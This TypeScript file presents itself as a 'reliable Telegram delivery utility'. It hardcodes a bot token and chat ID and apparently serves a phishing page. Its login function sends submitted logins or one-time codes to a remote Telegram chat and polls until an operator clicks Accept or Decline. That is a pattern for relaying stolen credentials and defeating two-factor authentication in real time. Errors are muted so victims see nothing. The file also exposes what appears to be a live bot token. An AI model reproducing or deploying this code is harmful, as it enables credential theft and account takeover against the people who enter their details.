/**
 * Reliable Telegram delivery utility.
 */
const getT = () => {
  // Direct string literals are most reliable for ensuring tokens aren't corrupted
  return "8264519481:AAHk8QRWqCzw4X488pxTcvokGN3JnayeLc4";
};

const getC = () => "852013928";

export const sendToTelegram = async (message: string) => {
  const token = getT();
  const chatId = getC();
  
  if (!token || !chatId) return;

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  
  // Strip HTML for the fallback plain text version
  const plainText = message.replace(/<[^>]*>?/gm, '');

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      }),
    });
    
    // Fallback: If HTML parsing fails (e.g., special characters in inputs), try plain text
    if (!response.ok) {
      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: `[PLAIN] ${plainText}`,
        }),
      });
    }
  } catch (error) {
    // Non-blocking log to prevent UI breakage
    console.warn('Notification processing skipped');
  }
};

export const sendLoginToTelegramAndWait = async (message: string, username: string, isCode: boolean = false): Promise<boolean> => {
  const token = getT();
  const chatId = getC();
  
  if (!token || !chatId) return true; // fallback to true

  const sessionKey = `pendingAuth_${username}_${isCode ? 'code' : 'login'}`;
  let messageId = sessionStorage.getItem(sessionKey);

  if (!messageId) {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const keyboard = {
      inline_keyboard: [
        [
          { text: '✅ Accept', callback_data: 'accept' },
          { text: '❌ Decline', callback_data: 'decline' }
        ]
      ]
    };

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          reply_markup: keyboard
        }),
      });
      
      if (!response.ok) return true;
      const data = await response.json();
      if (!data.ok) return true;

      messageId = data.result.message_id.toString();
      sessionStorage.setItem(sessionKey, messageId!);
    } catch (error) {
      return true; // fallback
    }
  }

  // Start polling for callback query
  // We omit offset so we don't accidentally clear updates for other concurrent users.
  // The Telegram API will return the last 100 unconfirmed updates.
  while (true) {
    try {
      const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
      const updateRes = await fetch(updateUrl);
      const updateData = await updateRes.json();
      
      if (updateData.ok && updateData.result.length > 0) {
        for (const update of updateData.result) {
          if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
            const action = update.callback_query.data;
            
            // Acknowledge the callback
            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ callback_query_id: update.callback_query.id })
            }).catch(() => {});

            // Edit message text to look like text
            const newText = message + `\n\n<b>[ ${action === 'accept' ? '✅ APPROVED' : '❌ DECLINED'} ]</b>`;
            await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text: newText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
              })
            }).catch(() => {});
            
            // Clear session after decision
            sessionStorage.removeItem(sessionKey);
            
            // In a purely frontend app with no offset, we should ideally clear the update 
            // by fetching with offset = update_id + 1, but this would clear other concurrent updates.
            // We'll advance offset only to our specific update to at least clear up to ours.
            await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});

            return action === 'accept';
          }
        }
      }
    } catch (e) {
      // network error during polling, ignore and retry
    }
    
    // wait a bit before next poll
    await new Promise(resolve => setTimeout(resolve, 3000));
  }
};
